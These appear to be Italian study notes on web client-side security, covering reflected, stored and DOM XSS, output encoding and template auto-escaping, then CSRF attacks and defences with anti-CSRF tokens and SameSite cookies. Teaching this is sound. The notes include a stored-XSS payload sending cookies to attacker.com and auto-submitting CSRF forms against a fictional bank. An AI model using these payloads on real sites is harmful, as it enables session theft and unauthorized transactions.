# Capitolo 1: Introduzione alla Client-Side Security e Reflected XSS

A differenza delle vulnerabilità *server-side* (come Command Injection o SQL Injection), in cui l'obiettivo è interagire direttamente con il database o il sistema operativo del server, con il **Cross-Site Scripting (XSS)** ci spostiamo sul versante della **sicurezza lato client**.

In questo contesto l'applicazione web vulnerabile funge solo da tramite: lo scopo reale dell'attaccante è **far eseguire codice arbitrario direttamente nel browser dell'utente vittima**.

---
### 1.1 Cos'è il Cross-Site Scripting (XSS)?

L'XSS è una vulnerabilità di tipo *code injection* in cui viene iniettato ed eseguito codice **JavaScript malevolo** all'interno della sessione di un ignaro visitatore.

Poiché JavaScript viene eseguito all'interno del browser con i privilegi dell'utente autenticato, un attaccante può sfruttarlo per:

* **Rubare i cookie di sessione (Session Hijacking)**: leggendo `document.cookie` e inviando i token al proprio server per accedere all'account senza password.

* **Esfiltrare dati sensibili**: estrarre testi riservati, informazioni personali o token CSRF visibili nella pagina.

* **Eseguire azioni per conto dell'utente**: forzare il browser a compiere operazioni (es. cambio password o transazioni) all'insaputa della vittima.

* **Defacciamento e Phishing**: alterare il layout HTML della pagina per mostrare finti form di login e rubare credenziali.

---

### 1.2 Il Reflected XSS (Non Persistente)

Il **Reflected XSS** è la tipologia più diffusa. Viene definito "riflesso" perché l'input malevolo inviato dal client viene **immediatamente rimbalzato indietro dal server nella risposta HTML**, senza essere prima filtrato o sanificato.
#### Anatomia di un codice vulnerabile (PHP)

Consideriamo uno script base (`hello.php`):
```php
<?php
  // Legge il parametro 'name' dall'URL e lo stampa direttamente nel DOM
  echo 'Ciao ' . $_GET['name'];
?>

```

* **Comportamento normale**: visitando `hello.php?name=Mario`, il server risponde con `Ciao Mario`.

* **Vettore di attacco**: l'attaccante invia alla vittima un link contenente un tag `<script>`:

```text
http://foo.bar/hello.php?name=<script>alert('XSS!')</script>
```

* **Esecuzione**: il server riflette il parametro tal quale nella risposta HTML (`Ciao <script>alert('XSS!')</script>`). Il browser della vittima, fidandosi del dominio `foo.bar`, interpreta ed esegue lo script aprendo il pop-up `alert('XSS!')`.

> [!WARNING] Regola pratica
> Il Reflected XSS **richiede sempre l'interazione della vittima**: l'utente deve cliccare sul link appositamente confezionato dall'attaccante per attivare l'esecuzione del payload nel proprio browser.
> 
> 

---

### 1.3 Identificazione e Caratteri Sentinella

Per individuare se un parametro è vulnerabile a Reflected XSS durante un test pratico, si segue questa metodologia:

1. **Localizzare i punti di riflessione**: cercare parametri di input (form, query string, barre di ricerca) il cui valore viene ristampato nel documento HTML di risposta.

2. **Iniettare caratteri sentinella HTML**: testare i simboli che modificano la struttura del DOM:
	* `<` e `>` (per aprire e chiudere tag HTML)
	* `"` e `'` (per rompere attributi HTML o stringhe JavaScript)

3. **Verificare il sorgente**: se inserendo una stringa di test come `<test>`, aprendo il sorgente della risposta (`View Source`) si trova esattamente il frammento `<test>` non trasformato, l'endpoint è privo di sanitizzazione ed è vulnerabile.

---
# Capitolo 2: Stored XSS e DOM-based XSS (Persistenza e Manipolazione del DOM)

Oltre al Reflected XSS, esistono due varianti fondamentali che differiscono per persistenza e per il punto in cui viene elaborato l'input: lo **Stored XSS** (memorizzato stabilmente nel server) e il **DOM-based XSS** (elaborato esclusivamente dal motore JavaScript del client).

---

### 2.1 Stored XSS (XSS Persistente)

A differenza del Reflected XSS (dove il payload rimbalza subito dal client al server e indietro), nello **Stored XSS** il codice malevolo viene **salvato in modo permanente nel backend** (ad esempio in un database, in un log o nei commenti di un forum).
#### Scenario pratico: I commenti di un blog

1. **Iniezione**: L'attaccante pubblica un commento inserendo uno script al posto del testo comune:

```html
Ottimo articolo! <script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
```

2. **Memorizzazione**: Il server accetta l'input senza filtrarlo e lo salva stabilmente nel database.

3. **Distribuzione passiva**: Ogni volta che un utente (o un amministratore) visita quell'articolo, il server estrae il commento dal database e lo include direttamente nell'HTML inviato al client.

4. **Esecuzione**: Il browser del visitatore esegue automaticamente il tag `<script>` presente nella pagina, trasmettendo i propri cookie di sessione al server dell'attaccante.

#### Perché è più grave?

* **Nessuna interazione mirata**: L'attaccante non deve ingannare la vittima inducendola a cliccare su link specifici.

* **Attacco passivo a catena**: È sufficiente che un utente navighi su una pagina legittima del sito per venire compromesso.

---

### 2.2 DOM-based XSS (XSS basato sul DOM)

Nel Reflected e nello Stored XSS la vulnerabilità risiede nel codice di backend che assembla l'HTML in modo insicuro. Nel **DOM-based XSS**, invece, la falla si trova interamente nel **codice JavaScript lato client** che gira all'interno del browser; il server potrebbe anche restituire HTML statico e non essere a conoscenza del payload.

```text
[Input utente] ──► (Source/Sorgente) ──► [JS Client-side] ──► (Sink/Esecuzione) ──► [Esecuzione XSS]
```
#### I concetti cardine: Source e Sink

Per scovare un DOM XSS si analizza il flusso dei dati tracciando due punti chiave nel codice JavaScript della pagina:

- **Source (Sorgente)**: La proprietà controllabile o manipolabile dall'utente dall'esterno (es. `window.location.hash` dopo il carattere `#`, `window.location.search`, o `document.referrer`).
- **Sink (Punto di esecuzione)**: La funzione o proprietà del DOM che riceve il dato e lo interpreta come codice o HTML (es. `element.innerHTML`, `document.write()`, o `eval()`).

#### Scenario pratico

Consideriamo questo snippet JavaScript presente nella pagina client:
```javascript
// Legge il frammento dell'URL dopo il carattere '#' (Source)
var utente = window.location.hash.substring(1);

// Inserisce il dato direttamente nel DOM interpretandolo come HTML (Sink)
document.getElementById("welcome").innerHTML = "Benvenuto " + utente;
```

Se l'attaccante porta la vittima all'URL:
```text
http://foo.bar/index.html#<img src=x onerror=alert(1)>
```

Lo script JavaScript estrae il frammento dopo l'ancora `#` e lo assegna a `innerHTML`. Il browser tenta di caricare l'immagine non valida `x`, scatena l'evento di errore `onerror` ed esegue `alert(1)`, senza che il backend del server sia intervenuto nel generare o riflettere la risposta.

---

# Capitolo 3: Strategie di Difesa XSS (Sanitizzazione, Auto-escaping e Template Engines)

La regola fondamentale per prevenire le vulnerabilità XSS è **non fidarsi mai dei dati non controllati provenienti dall'utente**. Per proteggere l'applicazione, qualsiasi valore dinamico inserito nel documento HTML deve essere trattato in modo che il browser lo interpreti esclusivamente come testo passivo e mai come codice eseguibile.

---

### 3.1 Sanitizzazione e Output Encoding (HTML Encoding)

La tecnica di difesa principale consiste nell'**Output Encoding** (o *HTML Entity Encoding*).

Consiste nel convertire i caratteri con significato sintattico in HTML nelle rispettive **entità HTML passive** prima di stamparli a schermo. In questo modo il browser si limita a visualizzare graficamente il carattere senza interpretarlo come delimitatore di tag o attributo.

#### Mappatura dei Caratteri Critici:

* `<` $\rightarrow$ `&lt;` (*less-than*)
* `>` $\rightarrow$ `&gt;` (*greater-than*)
* `"` $\rightarrow$ `&quot;` (*double quote*)
* `'` $\rightarrow$ `&#x27;` oppure `&apos;` (*single quote*)
* `&` $\rightarrow$ `&amp;` (*ampersand*)

#### Esempio pratico:

Se un utente invia `<script>alert(1)</script>` e l'applicazione applica l'encoding, il server restituirà:
```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

A video la stringa apparirà come testo normale, ma il motore del browser non avvierà alcuno script.

---

### 3.2 L'Approccio Manuale e i suoi Limiti

Ogni linguaggio include funzioni native per l'escaping. In **PHP**, ad esempio, si usa **`htmlspecialchars()`**:

```php
<?php
  // Codice SICURO: l'input viene encodato prima della stampa
  echo 'Ciao ' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

#### Il rischio dell'approccio manuale:
- **Errore umano**: In progetti complessi con centinaia di punti di output, è facile dimenticare la funzione su una singola variabile. Una sola omissione è sufficiente a rendere vulnerabile l'intera pagina.

---

### 3.3 Template Engines e Meccanismo di Auto-escaping

I framework moderni evitano la gestione manuale affidandosi ai **Template Engine** (es. *Jinja2* per Python, *Twig* per PHP, *EJS* per Node.js).

I motori di template separano la logica dal layout HTML tramite segnaposto (**placeholders**):

```html
<html>
<body>
    <h1>Ciao {{ user_name }}</h1>
</body>
</html>
```

#### Vantaggi dell'Auto-escaping:
- **Sicurezza by default**: Il motore di template applica automaticamente l'HTML encoding a tutti i placeholder (`{{ ... }}`) senza interventi manuali.
- **Esclusione esplicita**: Se serve stampare HTML non encodato, lo sviluppatore deve dichiararlo esplicitamente (es. usando filtri come `|safe`), riducendo al minimo le dimenticanze accidentali.

---
# Capitolo 4: Cross-Site Request Forgery (CSRF) - Meccanismo e Scenari d'Attacco

A differenza dell'XSS (che mira a eseguire codice nel browser della vittima), il **Cross-Site Request Forgery (CSRF)** punta ad **abusare della sessione autenticata di una vittima per eseguire azioni non autorizzate a sua insaputa**.

---
### 4.1 Definizione di CSRF

Il CSRF costringe il browser di un utente loggato a **inviare una richiesta indesiderata verso un sito web vulnerabile di cui l'applicazione si fida**.

L'attacco sfrutta un comportamento standard del web: quando effettuiamo il login, il server rilascia un cookie di sessione. Da quel momento, **il browser allega automaticamente quel cookie a qualsiasi richiesta successiva indirizzata a quel dominio**, indipendentemente da dove la richiesta sia partita.

Se un utente visita una pagina controllata dall'attaccante mentre è autenticato su un altro sito (es. la propria banca), la pagina malevola può innescare richieste verso la banca: il browser vi includerà in automatico i cookie di sessione validi e il server eseguirà l'azione ritenendola legittima.

---
### 4.2 Scenario d'Esempio: Il Trasferimento Fondi (HTTP GET)

Ipotizziamo che un'applicazione bancaria (`bank.site`) gestisca i trasferimenti tramite richieste GET senza protezioni aggiuntive:

#### 1. Flusso legittimo

L'utente trasferisce 1000€ compilando il form del sito:
```http
GET /transact?to=user2&money=1000 HTTP/1.1
Host: bank.site
Cookie: session_id=abc123xyz...
```

#### 2. Vettori di attacco dell'avversario
L'attaccante costruisce l'URL malevolo con il proprio account: `http://bank.site/transact?to=attacker&money=1000`. Può distribuirlo in due modi:

- **Vettore Interattivo (Link diretto)**: invia il link tramite phishing sperando che la vittima ci clicchi sopra.
- **Vettore Invisibile (Tag HTML)**: inserisce la richiesta in un tag passivo all'interno di un forum o di un sito web controllato:
    ```html
  <img src="http://bank.site/transact?to=attacker&money=1000" width="1" height="1">
    ```

Quando la vittima visita la pagina, il browser tenta di caricare l'immagine effettuando una richiesta GET a `bank.site` e **allegando automaticamente i cookie di sessione**. La banca riceve la richiesta autenticata ed esegue il bonifico senza mostrare schermate di conferma all'utente.

---

### 4.3 Il Problema di Fondo: L'Assenza di Stato (Stateless)

Il protocollo HTTP è **stateless** (senza stato). Ricevendo una richiesta con un cookie valido, il server non ha modo di distinguere se sia stata generata intenzionalmente dall'utente dal portale legittimo o partita in background da un sito terzo ostile.

---

### 4.4 CSRF su Richieste POST (Auto-submit Form)

Passare da richieste `GET` a richieste `POST` non risolve la vulnerabilità. Sebbene i tag `<img>` non supportino chiamate POST, l'attaccante può predisporre una pagina con un **form nascosto** che si invia da solo tramite un breve script JavaScript:

```html
<!-- Form nascosto verso il sito vulnerabile -->
<form id="csrfForm" action="http://bank.site/transact" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="money" value="1000">
</form>

<script>
  // Invia il modulo automaticamente all'apertura della pagina
  document.getElementById('csrfForm').submit();
</script>
```

Il browser effettua la chiamata `POST`, allega i cookie di sessione e inoltra la transazione all'insaputa dell'utente.

---
# Capitolo 5: Mitigazioni CSRF (Anti-CSRF Tokens e SameSite Cookies)

Per proteggersi dal CSRF, l'obiettivo è rendere ogni richiesta **stateful** e non riproducibile a priori da un sito terzo ostile.

I due meccanismi fondamentali di difesa sono il pattern del **Token Anti-CSRF** e l'attributo **SameSite** dei cookie.

---
### 5.1 Anti-CSRF Token (Synchronizer Token Pattern)

Rappresenta la contromisura standard implementata a livello applicativo.
#### Flusso di funzionamento:
1. **Generazione**: Quando l'utente richiede una pagina con un'azione sensibile, il server genera un valore alfanumerico casuale, unico e segreto per la sessione corrente.
2. **Memorizzazione**: Il server salva il token nella sessione dell'utente.
3. **Inclusione nel Form**: Il token viene inserito nell'HTML come campo nascosto (`<input type="hidden">`):


```html
<form action="/transact" method="POST">
  <input type="hidden" name="csrf_token" value="aBcDeF123456...">
  <button type="submit">Invia Denaro</button>
</form>
```


4. **Verifica**: All'invio del modulo, il backend confronta il token trasmesso con quello memorizzato nella sessione dell'utente. Se mancano o non coincidono, la richiesta viene respinta.
#### Perché è efficace?

La difesa sfrutta la **Same-Origin Policy (SOP)** del browser: uno script in esecuzione su un sito terzo ostile (es. `attacker.site`) non ha i permessi per leggere il DOM o i dati presenti su `bank.site`. L'attaccante può indurre l'invio della richiesta, ma non potendo leggere il token segreto, la richiesta contraffatta fallirà la validazione.

---

### 5.2 SameSite Cookies: Difesa a Livello Browser

L'attributo **SameSite** nell'header `Set-Cookie` definisce le regole con cui il browser deve allegare i cookie di sessione nelle richieste originate da contesti esterni (*cross-site*).

#### Classificazione dei domini:

* **First Party (Same-Site)**: Il dominio che l'utente sta navigando direttamente (es. `foo.example.com` rispetto a `example.com`).

* **Third Party (Cross-Site)**: Un dominio esterno rispetto alla pagina visualizzata (es. risorse caricate da `analytics.com` mentre si naviga su `google.com`).

* **Same Party**: Insieme di domini differenti appartenenti alla stessa organizzazione (First-Party Sets) autorizzati a condividere cookie.

![[Screenshot 2026-08-20 alle 17.03.00.png]]

---

### 5.3 I Tre Livelli dell'Attributo SameSite

1. **`SameSite=Strict`**: Il cookie viene inviato **solo ed esclusivamente** per richieste originate dallo stesso sito (*same-site*). Se l'utente clicca su un link esterno legittimo per entrare nel portale, il cookie non viene trasmesso e risulterà non autenticato.

2. **`SameSite=Lax` (Default moderno)**: È la configurazione predefinita nei browser attuali. Il cookie viene allegato nelle richieste *same-site* e nella navigazione "top-level" (quando l'utente clicca direttamente su un link 🔗). **Non viene inviato** per richieste di background generate da tag come `<img>`, `<iframe>` o chiamate AJAX asincrone.

3. **`SameSite=None`**: Il cookie viene trasmesso per qualsiasi tipo di richiesta, sia *same-site* che *cross-site*. Per motivi di sicurezza, richiede obbligatoriamente anche il flag **`Secure`** (solo connessioni HTTPS).

> [!NOTE] Impatto di SameSite=Lax
> Grazie all'adozione di `Lax` come default nei browser moderni, gli attacchi CSRF convenzionali veicolati tramite elementi passivi (come `<img src="bank.site/...">`) vengono bloccati alla radice, poiché il browser omette automaticamente i cookie di sessione prima dell'invio.
> 
> 

---
